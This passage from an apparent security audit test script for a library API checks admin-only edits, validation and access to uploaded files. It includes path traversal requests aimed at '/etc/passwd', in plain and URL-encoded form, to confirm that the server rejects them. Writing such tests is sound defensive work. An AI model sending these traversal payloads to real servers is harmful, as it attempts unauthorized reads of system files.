      record("PERROLE", `${rt.role}: the same attack is rejected for this role too (fix applies regardless of who's uploading)`, attack.status === 400, `status ${attack.status}`);
    }
  }

  // ============================================================
  console.log("\n--- EDIT (Admin-only) ---");
  // ============================================================
  if (adminToken) {
    const r1 = await multipartRequest("POST", "/api/library/books", totToken, { title: "ZZLIBAUD EditMe", author: "orig author", resourceType: "book", doi: "10.1/orig" }, { name: "file", filename: "x.pdf", contentType: "application/pdf", content: "%PDF-1.4\n" + Math.random() });
    const bookId = r1.body.id;
    fx.bookIds.push(bookId);

    const r2 = await jsonRequest("PUT", `/api/library/books/${bookId}`, totToken, { title: "hacked", author: "x", resourceType: "book" });
    record("EDIT", "ToT (the actual uploader) STILL cannot edit -- Admin-only feature, no owner exception (matches the code's explicit comment)", r2.status === 403, `status ${r2.status}`);

    const r3 = await jsonRequest("PUT", `/api/library/books/${bookId}`, adminToken, { title: "ZZLIBAUD Edited Title", author: "new author", resourceType: "article", doi: "10.1/new", publicationYear: 2020 });
    record("EDIT", "Admin edit succeeds (200)", r3.status === 200, `status ${r3.status}`);
    if (r3.status === 200) {
      const allFieldsCorrect = r3.body.title === "ZZLIBAUD Edited Title" && r3.body.author === "new author" && r3.body.resourceType === "article" && r3.body.doi === "10.1/new" && r3.body.publicationYear === 2020;
      record("EDIT", "All edited fields reflect exactly in the response", allFieldsCorrect, JSON.stringify(r3.body));
      const { rows } = await pool.query("SELECT title, author, resource_type, doi, publication_year, filename FROM learning_materials WHERE id = ?", [bookId]);
      record("EDIT", "DB row matches exactly (not just the API response)", rows[0].title === "ZZLIBAUD Edited Title" && rows[0].author === "new author" && rows[0].resource_type === "article", JSON.stringify(rows[0]));
      record("EDIT", "The underlying FILE itself is untouched by a metadata-only edit (filename unchanged)", !!rows[0].filename, `filename=${rows[0].filename}`);
    }

    const r4 = await jsonRequest("PUT", `/api/library/books/${bookId}`, adminToken, { title: "", author: "x", resourceType: "book" });
    record("EDIT", "Edit with empty title -- rejected (expected 400)", r4.status === 400, `status ${r4.status}`);

    const r5 = await jsonRequest("PUT", "/api/library/books/999999999", adminToken, { title: "x", author: "x", resourceType: "book" });
    record("EDIT", "Editing a nonexistent book -- 404", r5.status === 404, `status ${r5.status}`);
  } else {
    record("EDIT", "Edit test block -- SKIPPED (no admin account found)", true, "skipped");
  }

  // ============================================================
  console.log("\n--- FILE ACCESS: logged-out / cross-role ---");
  // ============================================================
  {
    const r1 = await multipartRequest("POST", "/api/library/books", totToken, { title: "ZZLIBAUD FileAccess", author: "x", resourceType: "book" }, { name: "file", filename: "x.pdf", contentType: "application/pdf", content: "%PDF-1.4\n" + Math.random() });
    fx.bookIds.push(r1.body.id);
    const filename = r1.body.filename;

    const r2 = await rawFileRequest(`/uploads/materials/${filename}`, null);
    record("FILEACCESS", "Logged-out (no token at all) -- rejected (expected 401)", r2.status === 401, `status ${r2.status}`);

    const r3 = await rawFileRequest(`/uploads/materials/${filename}`, traineeToken);
    record("FILEACCESS", "Trainee CAN access a book file (by design -- Library is fully shared, confirmed from code)", r3.status === 200, `status ${r3.status}`);

    const r4 = await rawFileRequest(`/uploads/materials/../../../etc/passwd`, totToken);
    record("FILEACCESS", "Path traversal in the URL itself -- rejected (expected 400, filename regex)", r4.status === 400 || r4.status === 404, `status ${r4.status}`);

    const r5 = await rawFileRequest(`/uploads/materials/${encodeURIComponent("..%2f..%2f..%2fetc%2fpasswd")}`, totToken);
    record("FILEACCESS", "URL-encoded path traversal attempt -- rejected", r5.status === 400 || r5.status === 404, `status ${r5.status}`);
  }

  console.log("\n" + "=".repeat(70));
  const bySection = {};
  results.forEach((r) => { (bySection[r.section] = bySection[r.section] || []).push(r); });
  let totalPass = 0, totalFail = 0;
  Object.entries(bySection).forEach(([section, rs]) => {
    const pass = rs.filter((r) => r.ok).length;
    console.log(`${section}: ${pass}/${rs.length}`);
    totalPass += pass; totalFail += rs.length - pass;
  });
  console.log("=".repeat(70));
  console.log(`TOTAL: ${totalPass}/${totalPass + totalFail} checks passed`);
  console.log("=".repeat(70));
  console.log("\nFAILURES:");
  results.filter((r) => !r.ok).forEach((r) => console.log(`  [${r.section}] ${r.name} -- ${r.detail}`));

  await wipe();
  console.log("\nCleaned up ZZLIBAUD fixtures.");
  process.exit(totalFail > 0 ? 1 : 0);
}

main().catch(async (err) => {
  console.error("FATAL:", err);
  try { await wipe(); } catch {}
  process.exit(1);
});
